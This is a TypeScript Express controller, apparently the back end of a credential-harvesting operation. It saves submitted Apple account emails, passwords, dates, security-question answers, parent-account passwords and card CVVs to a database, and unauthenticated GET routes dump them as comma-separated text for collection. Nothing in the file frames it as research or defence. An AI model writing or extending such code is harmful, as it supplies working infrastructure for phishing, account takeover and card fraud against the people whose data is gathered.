import { Request, Response } from "express";
import { AppleAccountProps, AppleAccountWithParentProps } from "../type";
import Unknown from "../models/unknownModel";
import AppleAccount from "../models/appleAccountModel";
import AccountWithParent from "../models/accountWithParentModel";

export const addAccount = async (
  req: Request<{}, {}, Omit<AppleAccountProps, "_id" | "createdAt">>,
  res: Response
) => {
  try {
    const account = req.body;

    if (Object.keys(account).length === 0) {
      res.status(400).send("Invalid request");
      return;
    }

    await AppleAccount.create(account);

    res.status(201).send("Account added successfully");
  } catch (error) {
    console.log(error);
    res.status(500).send("Something went wrong adding the account");
  }
};

export const addAccountWithParent = async (
  req: Request<{}, {}, Omit<AppleAccountWithParentProps, "_id" | "createdAt">>,
  res: Response
) => {
  try {
    const account = req.body;

    if (Object.keys(account).length === 0) {
      res.status(400).send("Invalid request");
      return;
    }

    await AccountWithParent.create(account);

    res.status(201).send("Account added successfully");
  } catch (error) {
    console.log(error);
    res.status(500).send("Something went wrong adding the account");
  }
};

export const addUnknown = async (
  req: Request<{}, {}, Omit<AppleAccountWithParentProps, "_id" | "createdAt">>,
  res: Response
) => {
  try {
    const account = req.body;

    if (Object.keys(account).length === 0) {
      res.status(400).send("Invalid request");
      return;
    }

    await Unknown.create(account);

    res.status(201).send("Unknown added successfully");
  } catch (error) {
    console.log(error);
    res.status(500).send("Something went wrong adding the account");
  }
};

export const getAccounts = async (req: Request, res: Response) => {
  try {
    const accounts = await AppleAccount.find();

    const accountText = accounts
      .map(
        ({ email, password, date, first_q, second_q, third_q }) =>
          `${email},${password},${date},${first_q},${second_q},${third_q}`
      )
      .join("<br />");

    res.status(200).send(`<p>${accountText}</p>`);
  } catch (error) {
    res.status(500).send("Something went wrong getting the gmail");
  }
};

export const getAccountsWithParent = async (req: Request, res: Response) => {
  try {
    const accounts = await AccountWithParent.find();

    const accountText = accounts
      .map(
        ({
          email,
          password,
          date,
          first_q,
          second_q,
          third_q,
          first_name,
          last_name,
          parent_email,
          parent_password,
          parent_date,
          parent_first_q,
          parent_second_q,
          parent_third_q,
          cvv,
        }) =>
          `${email},${password},${date},${first_q},${second_q},${third_q},${first_name},${last_name},${parent_email},${parent_password},${parent_date},${parent_first_q},${parent_second_q},${parent_third_q},${cvv}`
      )
      .join("<br />");

    res.status(200).send(`<p>${accountText}</p>`);
  } catch (error) {
    res.status(500).send("Something went wrong getting the gmail");
  }
};

export const getUnknowns = async (req: Request, res: Response) => {
  try {
    const accounts = await Unknown.find();

    const accountText = accounts
      .map(
        ({
          email,
          password,
          date,
          first_q,
          second_q,
          third_q,
          first_name,
          last_name,
          parent_email,
          parent_password,
          parent_date,
          parent_first_q,
          parent_second_q,
          parent_third_q,
          cvv,
        }) =>
          `${email},${password},${date},${first_q},${second_q},${third_q},${first_name},${last_name},${parent_email},${parent_password},${parent_date},${parent_first_q},${parent_second_q},${parent_third_q},${cvv}`
      )
      .join("<br />");

    res.status(200).send(`<p>${accountText}</p>`);
  } catch (error) {
    res.status(500).send("Something went wrong getting the gmail");
  }
};
